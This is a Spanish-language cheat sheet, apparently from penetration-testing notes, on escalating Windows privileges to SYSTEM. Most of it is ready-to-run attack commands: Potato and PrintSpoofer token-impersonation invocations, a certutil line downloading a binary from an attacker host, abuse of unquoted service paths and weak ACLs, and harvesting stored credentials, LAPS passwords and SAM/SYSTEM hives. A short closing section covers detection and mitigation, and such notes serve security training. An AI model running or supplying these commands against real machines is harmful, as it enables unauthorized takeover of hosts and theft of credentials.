---
title: Privesc Windows — SeImpersonate, servicios y credenciales
tags: [windows, privesc, seimpersonate, laps, servicios]
---

# Privesc Windows: de usuario a SYSTEM/Administrator

[🇬🇧 English](privesc-windows.en.md) | **Español**

## 1. Triaje

```cmd
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net localgroup administrators
```

Prioriza, por orden: privilegios (`SeImpersonate`, `SeBackup`, `SeDebug`, `SeTakeOwnership`), credenciales almacenadas, servicios mal configurados, y por último exploits de kernel.

## 2. SeImpersonate → SYSTEM

Con `SeImpersonatePrivilege` (típico en cuentas de servicio IIS/MSSQL):

```cmd
PrintSpoofer.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe"
```

El binario debe coincidir con la arquitectura y la versión de Windows; GodPotato cubre 2019/2022 y 10/11. Subida por `certutil -urlcache -f http://<LHOST>/x.exe C:\Windows\Temp\x.exe`.

## 3. Servicios y tareas

```cmd
accesschk.exe -uwcqv "Everyone" * /accepteula
sc qc <servicio>
icacls "C:\Program Files\<app>"
```

- **Ruta sin comillas**: `C:\Program Files\My App\svc.exe` → crea `C:\Program.exe`.
- **ACL débil en el binario**: reemplázalo y reinicia el servicio (`sc stop/start`).
- **Servicio con `StartName` de usuario y contraseña en el registro**: `reg query HKLM\SYSTEM\CurrentControlSet\Services\<svc>` (a veces en claro).
- **Tareas programadas** escribibles: cambia el script que ejecuta.

## 4. Credenciales guardadas

```cmd
cmdkey /list
dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

- `runas /savecred /user:<admin> cmd` si `cmdkey` muestra credenciales.
- `Get-ChildItem -Recurse -Include *.xml,*.config,*.txt` buscando `password=`.
- **Unattend.xml**, `sysprep.inf`, `web.config`, `applicationHost.config`.

## 5. LAPS, PFX y backups

- **LAPS**: si el equipo lo usa, la contraseña del Administrador local está en AD; con permisos de lectura: `nxc ldap <DC> -u '<user>' -p '<pass>' --laps` o `Get-LapsADPassword` (módulo en el host).
- **PFX**: `certutil -importpfx` o `openssl pkcs12 -in cert.pfx -nodes`; con la clave y el certificado se hace WinRM/PKINIT.
- **SeBackupPrivilege**: `robocopy /B` sobre `C:\Users\Administrator\Desktop` o copia de `SAM`/`SYSTEM` para `secretsdump`.

## 6. Errores típicos

- **`whoami /priv` muestra el privilegio como `Disabled`** → hay que habilitarlo (PowerShell `AdjustTokenPrivileges`, o el Potato lo hace solo).
- **El Potato falla con `Access is denied`** → falta `SeImpersonate` real o el proceso corre con integridad baja.
- **`sc start` da error 1053** → el servicio no arranca por configuración; prueba a reiniciar el equipo o usar la tarea.
- **No puedes escribir en `C:\Program Files`** → busca la ruta sin comillas en un directorio escribible (`C:\Temp`).
- **LAPS sin acceso** → no tienes `ReadLAPSPassword` sobre el objeto; revisa ACLs.

## 7. Detección y mitigación

- Quitar `SeImpersonate` a cuentas de aplicación cuando no sea imprescindible (y usar cuentas virtuales).
- Comillas en todas las rutas de servicio y ACLs estrictas en binarios y directorios.
- Rotar credenciales guardadas; eliminar `cmdkey`/Unattend con contraseñas.
- LAPS en todos los equipos, con lectura restringida y auditoría de accesos.
- Alertar de procesos `*Potato*`, `PrintSpoofer` y de servicios nuevos (7045).

MITRE: T1134.001, T1543.003, T1552.001, T1548.
